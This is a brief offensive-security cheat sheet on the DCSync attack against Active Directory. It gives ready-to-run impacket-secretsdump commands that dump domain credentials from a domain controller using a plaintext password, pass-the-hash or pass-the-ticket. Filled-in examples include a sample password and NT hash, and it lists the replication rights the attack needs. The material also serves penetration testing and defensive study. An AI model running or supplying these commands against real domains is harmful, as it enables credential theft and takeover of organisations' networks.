# Replication

## DCSync

### Execution

```bash
############
### UNIX ###
############
# using a plaintext password
impacket-secretsdump -outputfile $FILES_NAME "$DOMAIN"/"$USER":"$PASSWORD"@"$DOMAINCONTROLLER"
# impacket-secretsdump -outputfile contoso.dump 'CONTOSO.ORG'/'Administrator':'win2016-cli-P@$swd'@'192.168.68.64'

# with PTH (COMPUTERNAME$)
impacket-secretsdump -outputfile $FILES_NAME -hashes $LMHASH:$NTHASH $DOMAIN/"$USER"@"$DOMAINCONTROLLER"
# impacket-secretsdump -outputfile contoso.dump -hashes aad3b435b51404eeaad3b435b51404ee:d0773d3d8ae3a0f436b2b7e649faa137 'CONTOSO.ORG/WIN-NUU0DPB1BVC$@192.168.68.64'

# PTT
impacket-secretsdump -k -outputfile $FILES_NAME "$DOMAIN"/"$USER"@"$KDC_DNS_NAME"
# impacket-secretsdump -k -outputfile contoso.org.dump WIN-KML6TP4LOOL.contoso.org

# NTLM relay is POSSIBLE IF VULNERABLE TO ZEROLOGON
```

### Prerequisites

1. DS-Replication-Get-Changes (part of GenericAll on Domain object (Enterprise Admins))
2. DS-Replication-Get-Changes-All (part of GenericAll on Domain object (Enterprise Admins))
